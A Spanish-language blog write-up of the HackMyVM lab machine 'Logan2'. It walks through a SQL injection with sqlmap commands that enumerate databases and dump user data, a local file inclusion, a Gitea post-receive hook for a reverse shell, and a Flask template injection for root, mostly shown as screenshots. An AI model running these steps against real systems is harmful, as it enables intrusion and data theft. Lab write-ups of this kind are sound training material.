...
description: "Se identificaron los puertos 22, 80 y 3000 abiertos, destacando un Gitea en el puerto 3000 y una app web vulnerable en el puerto 80. Se explotó una inyección SQLi para obtener un subdominio y luego un LFI que permitió leer archivos sensibles. Con credenciales obtenidas, se explotó una vulnerabilidad autenticada en Gitea para obtener una shell como usuario. Finalmente, se aprovechó una vulnerabilidad SSTI en una app Flask ejecutada como root para escalar privilegios."
pin: true
image:
  path: /posts/2023-12-15-HVM-Logan2/logan2.png
---
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%201.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%202.png)

Correponde a Gitea y su versión es la 1.12.5.

![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%203.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%204.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%205.png)

![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%206.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%207.png)
...
1. `sqlmap --url [http://192.168.1.140/save-user-agent.php](http://192.168.1.140/save-user-agent.php) --method post --data '{"user_agent":"param"}' --batch`
   ...
   ![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%208.png)
...
2. `sqlmap --url [http://192.168.1.140/save-user-agent.php](http://192.168.1.140/save-user-agent.php) --method post --data '{"user_agent":"param"}' --batch --dbs` para ver las bases de datos.
   ...
   ![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%209.png)
...
3. `sqlmap --url [http://192.168.1.140/save-user-agent.php](http://192.168.1.140/save-user-agent.php) --method post --data '{"user_agent":"param"}' --batch -D logan -tables` para ver tablas de la base de datos.
   ...
   ![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2010.png)
...
4. `sqlmap --url [http://192.168.1.140/save-user-agent.php](http://192.168.1.140/save-user-agent.php) --method post --data '{"user_agent":"param"}' --batch -D logan -T users -columns` para ver columnas de la tabla.
   ...
   ![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2011.png)
...
5. `sqlmap --url [http://192.168.1.140/save-user-agent.php](http://192.168.1.140/save-user-agent.php) --method post --data '{"user_agent":"param"}' --batch -D logan -T users -C user,email -dump`
   ...
   ![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2012.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2013.png)

## Explotación de LFI

Explorando un poco el dominio encontrado, encuentro lo siguiente en el código fuente.

![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2014.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2015.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2016.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2017.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2018.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2019.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2020.png)

![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2021.png)

Hay unas credenciales, las cuales pruebo en ssh sin exíto y luego en gitea y logro loguear como el usuario logan.

![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2022.png)
...
1. crear un repositorio con cualquier nombre.
   ...
   ![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2023.png)

2. Crear un `Git Hook` del tipo `post-receive` , el cual incluya el comando que quiero ejecutar.

   ![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2024.png)

   ![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2025.png)

3. Clonar repositorio en nuestra maquina y configurar el usuario logan.

   ![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2026.png)
...
4. Por último crear un archivo cualquiera y hacer la `add` , `commit` y `push`. mientras estamos en escucha por el puerto que indicamos en el hook.
   ...
   ![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2027.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2028.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2029.png)

## SSTI (Server Side Template Injection)

Inspeccionando su codigo encuentro esto.

![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2030.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2031.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2032.png)
...
![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2033.png)

![Untitled](/posts/2023-12-15-HVM-Logan2/Untitled%2034.png)
